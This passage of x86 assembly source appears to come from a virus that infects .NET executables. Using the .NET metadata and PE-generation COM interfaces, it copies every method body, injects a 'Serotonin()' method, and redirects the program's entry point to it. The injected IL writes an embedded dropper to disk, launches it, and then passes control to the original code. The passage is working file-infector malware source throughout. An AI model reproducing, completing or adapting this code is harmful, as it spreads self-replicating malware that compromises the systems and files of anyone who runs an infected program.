	push	ebx
	call	[ebp + net_GetProcAddress - net_delta]	;get API addressez
	xchg	eax,edi

	@pushsz	'CreateICeeFileGen'
	push	ebx
	call	[ebp + net_GetProcAddress - net_delta]

	call	@net_ICeeFileGen
	dd	?
@net_ICeeFileGen:
	call	eax					;create ICeeFileGen interface

	mov	esi,[ebp + @net_ICeeFileGen-4 - net_delta]
	mov	esi,[esi]

	lea	ebx,[ebp + net_icfg_handle - net_delta]
	push	ebx
	call	[esi.ICeeFileGen_CreateCeeFile]		;create new session
	mov	ebx,12345678h				;handle to EBX
net_icfg_handle = dword ptr $-4


	call	@net_outfilew
net_outfilew	dw	's','3','r','0','t','0','n','l','n','.','3','x','3',0
@net_outfilew:
	push	ebx
	call	[esi.ICeeFileGen_SetOutputFileName]	;set output filename to "s3r0t0nln.3x3"

	push	ebx
	call	[esi.ICeeFileGen_LinkCeeFile]		;recompile file in memory

	lea	eax,[ebp + net_icfg_section - net_delta]
	push	eax
	push	ebx
	call	[esi.ICeeFileGen_GetIlSection]		;get storage section

	lea	eax,[ebp + net_sec_rva - net_delta]
	push	eax
	push	dword ptr [ebp + net_icfg_section - net_delta]
	call	[esi.ICeeFileGen_GetSectionRVA]		;get RVA of section

	lea	eax,[ebp + net_il_section - net_delta]
	push	eax
	push	1
	push	4
	push	dword ptr [ebp + net_icfg_section - net_delta]
	call	[esi.ICeeFileGen_GetSectionBlock]	;allocate 4 bytez (query memory address)

	lea	eax,[ebp + net_section_offset - net_delta]
	push	eax
	push	dword ptr [ebp + net_il_section - net_delta]
	push	dword ptr [ebp + net_icfg_section - net_delta]
	call	[esi.ICeeFileGen_ComputeSectionOffset]	;compute offset in section

	lea	eax,[ebp + net_sec_rva - net_delta]
	push	eax
	add	[eax],12345678h				;compute RVA of Serotonin() method
net_section_offset = dword ptr $-4
	add	dword ptr [eax],4
	push	dword ptr [eax]
	push	dword ptr [ebp + net_methodToken - net_delta]
	mov	eax,[ebp + net_pEmit - net_delta]
	push	eax
	mov	eax,[eax]
	call	[eax.IMetaDataEmit_SetRVA]		;set it

	pop	eax
	mov	eax,[eax]
	add	eax,net_ILcode_size			;compute RVA of end of Serotonin()
	push	eax					;(place for dropper)
	push	dword ptr [ebp + net_field_scm - net_delta]
	mov	eax,[ebp + net_pEmit - net_delta]
	push	eax
	mov	eax,[eax]
	call	[eax.IMetaDataEmit_SetFieldRVA]		;set it

	push	dword ptr [ebp + net_droppercodesize - net_delta]
	push	0					;.size XXXXXX (size of dropper)
	push	1					;.pack 1
	push	12345678h
net_class_scs = dword ptr $-4
	mov	eax,[ebp + net_pEmit - net_delta]
	push	eax
	mov	eax,[eax]
	call	[eax.IMetaDataEmit_SetClassLayout]	;set class "scs" properties



	;Now enumerate all present classes and call method enumeration procedure

	xor	eax,eax
	and	[ebp + net_typedefToken - net_delta],eax;global methods at 1st
	and	[ebp + net_enum_typedef_handle - net_delta],eax

net_enum_typedef_loop:
	mov	edx,12345678h
net_typedefToken = dword ptr $-4
	call	net_enum_methods			;enumerate all present methods

	lea	eax,[ebp + net_typedef_count - net_delta]
	push	eax
	push	1
	lea	eax,[ebp + net_typedefToken - net_delta]
	push	eax
	lea	eax,[ebp + net_enum_typedef_handle - net_delta]
	push	eax
	mov	eax,[ebp + net_pImp - net_delta]
	push	eax
	mov	eax,[eax]
	call	[eax.IMetaDataImport_EnumTypeDefs]	;get next typedef (class)
	test	eax,eax
	jne	net_enum_typedefs_no_close

	mov	ecx,12345678h
net_typedef_count = dword ptr $-4
	jecxz	net_end_enum_typedef
	jmp	net_enum_typedef_loop			;and enumerate in a loop


net_end_enum_typedef:
	mov	eax,12345678h
net_enum_typedef_handle = dword ptr $-4
	call	net_close_enum				;finish enumeration



net_enum_typedefs_no_close:

	mov	ecx,[ebp + net_il_memory_offset - net_delta]
	sub	ecx,[ebp + net_il_memory - net_delta]
	push	ecx

	lea	eax,[ebp + net_il_section - net_delta]
	push	eax
	push	1
	push	ecx
	push	12345678h
net_icfg_section = dword ptr $-4
	call	[esi.ICeeFileGen_GetSectionBlock]	;get address of IL buffer inside PE

	pop	ecx
	pushad
	mov	esi,[ebp + net_il_memory - net_delta]
	mov	edi,12345678h
net_il_section = dword ptr $-4
	rep	movsb					;copy there whole internal buffer
	popad						;(all IL code)

	push	MEM_RELEASE
	push	0
	push	dword ptr [ebp + net_il_memory - net_delta]
	mov	eax,12345678h
net_VirtualFree = dword ptr $-4
	call	eax					;free IL buffer

	push	12345678h
net_methodToken = dword ptr $-4
	push	ebx
	call	[esi.ICeeFileGen_SetEntryPoint]		;set entrypoint to Serotonin() method

	push	dword ptr [ebp + net_pEmit - net_delta]
	push	ebx
	call	[esi.ICeeFileGen_EmitMetaDataEx]	;write metadata to PE file

	push	ebx
	call	[esi.ICeeFileGen_LinkCeeFile]		;recompile PE in memory

	push	ebx
	call	[esi.ICeeFileGen_GenerateCeeFile]	;write PE to disk

	lea	eax,[ebp + net_icfg_handle - net_delta]
	push	eax
	call	[esi.ICeeFileGen_DestroyCeeFile]	;close session

	lea	eax,[ebp + @net_ICeeFileGen-4 - net_delta]
	push	eax
	call	edi					;release interface


net_unload_mscorpe:
	push	12345678h
net_mscorpe = dword ptr $-4
	call	[ebp + net_FreeLibrary - net_delta]	;unload mscorpe.dll

net_err2_com:
	mov	eax,12345678h
net_pImp = dword ptr $-4
	mov	ecx,[eax]
	push	eax
	call	[ecx.IUnknown_Release]			;release IMetaDataImport interface

	mov	eax,[ebp + net_pEmit - net_delta]
	mov	ecx,[eax]
	push	eax
	call	[ecx.IUnknown_Release]			;release IMetaDataEmit interface

net_err1_com:
	mov	eax,[ebp + net_pDisp - net_delta]
	mov	ecx,[eax]
	push	eax
	call	[ecx.IUnknown_Release]			;release IMetaDataDispenser interface

	popad
	ret						;and quit

net_com_metadata	EndP






;this procedure can convert RVA address to RAW pointer

net_rva2raw	Proc
	pushad


	movzx	edx,word ptr [esi.NT_FileHeader.FH_SizeOfOptionalHeader-4]
	add	edx,IMAGE_SIZEOF_FILE_HEADER
	add	edx,esi
	movzx	ecx,word ptr [esi.NT_FileHeader.FH_NumberOfSections-4]
							;EDX = section header, ecx = number of sections
net_r2r_start:
	mov	edi,[edx.SH_VirtualAddress]		;get virtual address
	cmp	eax,edi					;compare if RVA fits to this section
	jb	net_r2r_loop
	add	edi,[edx.SH_VirtualSize]		; + virtual size
	cmp	eax,edi
	jnb	net_r2r_loop				;compare if RVA fits to this section

	sub	eax,[edx.SH_VirtualAddress]		; - virtual address
	add	eax,[edx.SH_PointerToRawData]		; + pointer to RAW data
	add	eax,[ebp + net_mappedfile - net_delta]	; + base address of file in memory

	mov	[esp.Pushad_eax],eax			;to EAX
	popad
	ret						;and quit

net_r2r_loop:
	add	edx,IMAGE_SIZEOF_SECTION_HEADER		;get to next section header
	jmp	net_r2r_start
net_rva2raw	EndP






;this procedure can enumerate all methods in current typedef (class) and copy their
;bodiez to internal buffer

net_enum_methods	Proc
	pushad
	and	dword ptr [ebp + net_enum_method_handle - net_delta],0

net_enum_methods_loop:
	push	edx

	lea	eax,[ebp + net_enum_method_count - net_delta]
	push	eax
	push	1
	lea	eax,[ebp + net_enum_method_token - net_delta]
	push	eax
	push	edx
	lea	eax,[ebp + net_enum_method_handle - net_delta]
	push	eax
	mov	eax,[ebp + net_pImp - net_delta]
	push	eax
	mov	eax,[eax]
	call	[eax.IMetaDataImport_EnumMethods]	;get next method
	test	eax,eax
	jne	net_enum_methods_no_close

	mov	eax,12345678h
net_enum_method_count = dword ptr $-4
	test	eax,eax
	je	net_end_enum_methods			;quit if no method found

	dec	eax
	push	eax
	lea	ecx,[ebp + net_CodeRva - net_delta]
	push	ecx
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	12345678h
net_enum_method_token = dword ptr $-4
	mov	eax,[ebp + net_pImp - net_delta]
	push	eax
	mov	eax,[eax]
	call	[eax.IMetaDataImport_GetMethodProps]	;get method properties (RVA)

	mov	esi,[esp.cPushad+4+Pushad_esi+4]
	mov	eax,12345678h
net_CodeRva = dword ptr $-4
	call	net_rva2raw				;get RAW ptr to method body

	mov	[ebp + net_method_code_ptr - net_delta],eax
	xchg	eax,edx
	mov	al,[edx]				;get 1st byte
	and	al,mask T_Flags				;get flags only
	cmp	al,CORILMETHOD_FATFORMAT
	je	net_fat					;jmp if method has FAT format
	cmp	al,CORILMETHOD_TINYFORMAT1		;check if the size is odd

	;CORILMETHOD_TINYFORMAT

	pushfd						;store flagz
	movzx	eax,byte ptr [edx]			;get 1st byte
	and	al,mask T_CodeSize			;get codesize only
	shr	eax,T_CodeSize				;shift
	imul	eax,2					;multiply by 2
	inc	eax					; + method header byte
	popfd						;restore flags
	jne	net_even
	inc	eax					;size is odd, increment size by one
net_even:
	xor	ecx,ecx
	xchg	eax,ecx					;size to EAX
	jmp	net_ofat

	;CORILMETHOD_FATFORMAT

net_fat:mov	eax,[edx.F_ddRecord]			;get 1st dword
	mov	ecx,eax
	and	eax,mask F_Size				;get "header size / 4" only
	shr	eax,F_Size				;shift
	imul	eax,4					;multiply by 4
	add	eax,[edx.F_CodeSize]			; + size of code
	xchg	eax,ecx					;to ECX
	and	eax,mask F_Flags			;get flags only

net_ofat:
	call	net_copy_il				;copy IL code of method to internal buffer

	pushad
	mov	eax,12345678h
net_il_code_ptr = dword ptr $-4
	sub	eax,12345678h
net_il_memory = dword ptr $-4
	add	eax,12345678h
net_sec_rva = dword ptr $-4
	push	eax					;new computed RVA of method
	push	dword ptr [ebp + net_enum_method_token - net_delta]
	mov	eax,[ebp + net_pEmit - net_delta]
	push	eax
	mov	eax,[eax]
	call	[eax.IMetaDataEmit_SetRVA]		;set new RVA of method
	popad

	add	[ebp + net_method_code_ptr - net_delta],ecx

	test	al,CORILMETHOD_MORESECTS		;check if method has extra section
	je	net_end_copy				;no, jump

	add	edx,ecx					;yeah, get ptr to EDX

net_next_sect:
	xchg	eax,edx
	push	4
	pop	ecx
	xor	edx,edx
	div	ecx
	test	edx,edx
	je	net_oalign
	inc	eax
net_oalign:
	mul	ecx
	xchg	eax,edx					;align EDX to DWORD boundary

	mov	[ebp + net_method_code_ptr - net_delta],edx

	push	edx
	mov	eax,[ebp + net_il_memory_offset - net_delta]
	sub	eax,[ebp + net_il_memory - net_delta]
	push	4
	pop	ecx
	xor	edx,edx
	div	ecx
	test	edx,edx
	je	net_oalign2
	inc	eax
net_oalign2:
	mul	ecx
	add	eax,[ebp + net_il_memory - net_delta]	;align IL buffer pointer to DWORD boundary
	mov	[ebp + net_il_memory_offset - net_delta],eax
	pop	edx

	mov	eax,dword ptr [edx.SS_Kind]
	test	al,CORILMETHOD_SECT_FATFORMAT
	jne	net_osmall				;section is FAT format
net_small_sect:
	movzx	eax,ah					;section is small format
	jmp	net_ofat_sect				;get size to EAX
net_osmall:
	and	eax,mask SF_DataSize			;get size
	shr	eax,SF_DataSize				;shift
net_ofat_sect:
	xchg	eax,ecx					;to ECX
	call	net_copy_il				;and copy IL method section to IL buffer

net_end_copy:
	pop	edx
	jmp	net_enum_methods_loop			;get next method


net_end_enum_methods:
	mov	eax,12345678h
net_enum_method_handle = dword ptr $-4
	call	net_close_enum				;finish enumeration

net_enum_methods_no_close:
	pop	edx
	popad
	ret						;and quit
net_enum_methods	EndP






;this procedure can close enumeration handle

net_close_enum:
	push	eax
	mov	eax,[ebp + net_pImp - net_delta]
	push	eax
	mov	eax,[eax]
	call	[eax.IMetaDataImport_CloseEnum]
	ret






;this code can copy IL code to internal buffer. in case the buffer is full this
;procedure can allocate next page (handled by SEH).

net_copy_il	Proc
	pushad
	mov	edi,12345678h
net_il_memory_offset = dword ptr $-4
	mov	esi,12345678h
net_method_code_ptr = dword ptr $-4

net_copy_il_code:
	call	net_new_eh				;__try block


	;__except block

	mov	ecx,[esp.EH_ContextRecord]		;get address of context
	mov	esi,[ecx.CONTEXT_Esi]			;repair ESI register
	mov	edi,[ecx.CONTEXT_Edi]			;repair EDI register
	mov	ecx,[ecx.CONTEXT_Ecx]			;repair ECX register
	mov	esp,[esp.EH_EstablisherFrame]		;repair ESP register


	;alloc one page

	pushad
	push	PAGE_READWRITE
	push	MEM_COMMIT
	push	1000h
	push	edi
	mov	eax,12345678h
net_VirtualAlloc = dword ptr $-4
	call	eax					;allocate next page
	popad
	@SEH_RemoveFrame				;remove SEH handler
	jmp	net_copy_il_code			;and try again



net_new_eh:
	xor	edx,edx
	push	dword ptr fs:[edx]
	mov	fs:[edx],esp
	mov	[ebp + net_il_code_ptr - net_delta],edi
	rep	movsb					;copy the gen
	@SEH_RemoveFrame				;remove SEH handler
	mov	[ebp + net_il_memory_offset - net_delta],edi
	popad
	ret
net_copy_il	EndP






;this procedure can compress token into 1 - 3 bytez. used while creating new member signatures.
;See CorSigCompressToken function in cor.h for more info.

net_compress_token	Proc
	xor	ecx,ecx
	mov	edx,eax
	and	eax,0FFFFFFh
	xchg	eax,edx
	and	eax,0FF000000h
	xchg	eax,edx
	shl	eax,2
	cmp	edx,mdtTypeRef
	je	net_ct_1
	cmp	edx,mdtTypeSpec
	je	net_ct_2
	cmp	edx,mdtBaseType
	jne	net_ct_o
	or	eax,3
	jmp	net_ct_o
net_ct_2:
	or	eax,2
	jmp	net_ct_o
net_ct_1:
	or	eax,1
net_ct_o:
	cmp	al,7Fh
	ja	net_cs_medium
	movzx	eax,al
	inc	ecx
	jmp	net_cs_end
net_cs_medium:
	cmp	ax,3FFFh
	ja	net_cs_big
	push	eax
	shr	eax,8
	or	al,80h
	pop	edx
	mov	ah,dl
	inc	ecx
	inc	ecx
	jmp	net_cs_end

net_cs_big:
	shr	eax,24
	or	al,0C0h
	push	edx
	push	edx
	xchg	eax,edx
	shr	eax,16
	mov	dh,al
	pop	eax
	shr	eax,8
	shl	eax,16
	or	edx,eax
	pop	eax
	shl	eax,24
	xchg	eax,edx
	add	eax,edx
	mov	cl,3

net_cs_end:
	ret
net_compress_token	EndP






;Method header + body of Serotonin()

net_IL_code	Proc
			db	CORILMETHOD_INITLOCALS or CORILMETHOD_FATFORMAT,30h
			dw	04h			;.maxstack 4
			dd	net_ILcode_end-net_ILcode_codestart
net_localVars_signature	dd	?			;local variables signature
net_ILcode_codestart:

			db	020h			;LDC.I4
net_droppercodesize	dd	10h
			db	08Dh			;NEWARR
net_member_system_byte	dd	?
			db	025h			;DUP
			db	0D0h			;LDTOKEN
net_field_scm		dd	?
			db	028h			;CALL
net_member_initarray	dd	?
			db	080h			;STSFLD
net_field_int8_bytes	dd	?


			db	072h			;LDSTR
net_stringToken		dd	?

			db	00Ah			;STLOC.0
			db	006h			;LDLOC.0
			db	018h			;LDC.I4.2
			db	018h			;LDC.I4.2
			db	073h			;NEWOBJ
net_member_ctor1	dd	?
			db	073h			;NEWOBJ
net_member_ctor2	dd	?
			db	00Bh			;STLOC.1
			db	007h			;LDLOC.1
			db	07Eh			;LDSFLD
net_field_int8_bytes2	dd	?
			db	06Fh			;CALLVIRT
net_member_write	dd	?
			db	007h			;LDLOC.1
			db	06Fh			;CALLVIRT
net_member_close	dd	?
			db	006h			;LDLOC.0
			db	028h			;CALL
net_member_start	dd	?
			db	026h			;POP
			db	0DEh,0			;LEAVE.S

			db	27h			;JMP
net_EntryPointToken	dd	?			;


net_ILcode_size = $-net_IL_code
net_ILcode_end:
net_IL_code	EndP




end_dotnet:
dotnet	EndP